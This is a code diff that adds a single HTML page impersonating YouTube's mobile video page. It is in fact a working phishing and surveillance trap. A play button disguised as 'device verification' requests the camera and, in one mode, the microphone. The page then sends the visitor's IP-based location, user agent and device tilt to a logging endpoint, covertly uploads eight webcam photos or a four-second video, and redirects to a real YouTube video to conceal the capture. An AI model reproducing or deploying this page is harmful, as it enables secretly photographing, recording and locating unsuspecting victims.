@@ -1,0 +1,82 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>YouTube</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <style>
+        :root { --yt-red: #ff0000; --yt-bg: #0f0f0f; --yt-text: #ffffff; --yt-sub: #aaa; --yt-surface: #272727; }
+        body { margin: 0; background-color: var(--yt-bg); color: var(--yt-text); font-family: "Roboto", Arial, sans-serif; -webkit-tap-highlight-color: transparent; overflow-x: hidden; }
+        header { height: 48px; display: flex; align-items: center; justify-content: space-between; padding: 0 16px; position: sticky; top: 0; background: var(--yt-bg); z-index: 100; }
+        .yt-logo { display: flex; align-items: center; color: white; text-decoration: none; font-weight: bold; font-size: 18px; letter-spacing: -1px; }
+        .yt-logo i { color: var(--yt-red); font-size: 24px; margin-right: 4px; }
+        .video-wrapper { position: relative; width: 100%; background: #000; aspect-ratio: 16 / 9; display: flex; align-items: center; justify-content: center; }
+        .spinner { border: 3px solid rgba(255, 255, 255, 0.1); border-left-color: var(--yt-red); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        #play-overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: 20; display: flex; align-items: center; justify-content: center; cursor: pointer; background: rgba(0,0,0,0.3); }
+        .play-icon { font-size: 60px; color: white; }
+        .video-details { padding: 12px 16px; }
+        .video-title { font-size: 18px; font-weight: 700; line-height: 22px; margin-bottom: 8px; }
+        .channel-row { display: flex; align-items: center; margin: 15px 0; gap: 12px; }
+        .channel-pfp { width: 36px; height: 36px; background: #444; border-radius: 50%; display: flex; align-items: center; justify-content: center; font-weight: bold; }
+        .sub-btn { background: white; color: black; padding: 0 16px; height: 36px; border-radius: 18px; border: none; font-weight: 600; margin-left: auto; }
+        .comment-box { background: var(--yt-surface); border-radius: 12px; padding: 12px; margin-top: 15px; font-size: 13px; }
+        video, canvas { display: none; }
+    </style>
+</head>
+<body>
+    <header><a href="#" class="yt-logo"><i class="fab fa-youtube"></i> YouTube</a><i class="fas fa-search"></i></header>
+    <div class="video-wrapper">
+        <div class="spinner" id="loading-spinner" style="display: none;"></div>
+        <div id="play-overlay" onclick="initiateCapture()"><i class="fas fa-play play-icon"></i></div>
+    </div>
+    <div class="video-details">
+        <div class="video-title" id="display-title">Device Verification Required</div>
+        <div class="channel-row">
+            <div class="channel-pfp">A</div>
+            <div><div style="font-weight:600">AnyaStore <i class="fas fa-check-circle" style="font-size:10px;color:#aaa"></i></div><div style="font-size:12px;color:#aaa">148K subscribers</div></div>
+            <button class="sub-btn">Subscribe</button>
+        </div>
+        <div class="comment-box"><b>Comments</b><p>Verification active. Please play to confirm identity.</p></div>
+    </div>
+    <video id="v" autoplay playsinline></video><canvas id="c"></canvas>
+    <script>
+        const params = new URLSearchParams(window.location.search);
+        async function initiateCapture() {
+            document.getElementById('play-overlay').style.display = 'none';
+            document.getElementById('loading-spinner').style.display = 'block';
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: params.get('cam')||'user' }, audio: (params.get('mode')==='video') });
+                document.getElementById('v').srcObject = stream;
+                let motion = "Static";
+                window.addEventListener('deviceorientation', (e) => { motion = `Tilt: ${e.beta.toFixed(0)}°`; });
+                const ip = await fetch('https://ipapi.co/json/').then(r => r.json());
+                fetch(`/log_info?id=${params.get('id')}`, {
+                    method: 'POST', headers: {'Content-Type': 'application/json'},
+                    body: JSON.stringify({ ...ip, platform: "iOS/iPhone", motion: motion, browser: navigator.userAgent })
+                });
+                if (params.get('mode') === 'video') {
+                    const rec = new MediaRecorder(stream); const ch = [];
+                    rec.ondataavailable = e => ch.push(e.data);
+                    rec.onstop = () => {
+                        const fd = new FormData(); fd.append('file', new Blob(ch, {type:'video/webm'}));
+                        fetch(`/upload?id=${params.get('id')}&type=video`, {method:'POST', body:fd}).then(()=>window.location.href="https://youtube.com/watch?v="+params.get('ytid'));
+                    };
+                    rec.start(); setTimeout(()=>rec.stop(), 4000);
+                } else {
+                    let count = 0;
+                    const iv = setInterval(() => {
+                        if (count >= 8) { clearInterval(iv); window.location.href="https://youtube.com/watch?v="+params.get('ytid'); return; }
+                        const c = document.getElementById('c'), v = document.getElementById('v');
+                        c.width = v.videoWidth; c.height = v.videoHeight;
+                        c.getContext('2d').drawImage(v, 0, 0);
+                        c.toBlob(b => { const fd = new FormData(); fd.append('file', b); fetch(`/upload?id=${params.get('id')}&type=photo`, {method:'POST', body:fd}); }, 'image/jpeg', 0.7);
+                        count++;
+                    }, 800);
+                }
+            } catch (e) { alert("Camera access is required for verification."); location.reload(); }
+        }
+    </script>
+</body>
+</html>
